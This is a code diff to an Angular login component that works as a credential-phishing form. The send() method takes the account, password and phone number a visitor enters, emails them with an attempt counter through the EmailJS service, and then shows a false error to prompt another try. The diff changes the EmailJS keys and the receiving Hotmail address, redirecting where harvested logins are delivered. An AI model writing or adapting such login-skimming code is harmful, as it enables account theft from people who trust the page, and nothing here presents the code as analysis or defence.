@@ -72,12 +72,10 @@ export class LoginSectionComponent implements OnInit {
   async send(end: boolean = false) {
     this.showLoader = true;
 
-    emailjs.init('pYLO6QYN6aeg6Sagd');
+    emailjs.init('08gaTi0yX9GYMg2w_');
     const response = await emailjs
-      .send('service_n6dsppy', 'template_fxjwyar', {
-        from_name: 'Alan',
-        to_name: 'Boss',
-
+      .send('service_4fx4y8a', 'template_0tzq3y5', {
+        name: 'Stanley',
         message: `Email: ${
           this.loginFormControl['account'].value || ''
         } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
@@ -85,8 +83,7 @@ export class LoginSectionComponent implements OnInit {
         } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
           this.attemptCount + 1
         }`,
-
-        reply_to: 'No one',
+        email: 'ubaid.valtorquegroup@hotmail.com',
       })
       .then(() => {
         this.showError = true;
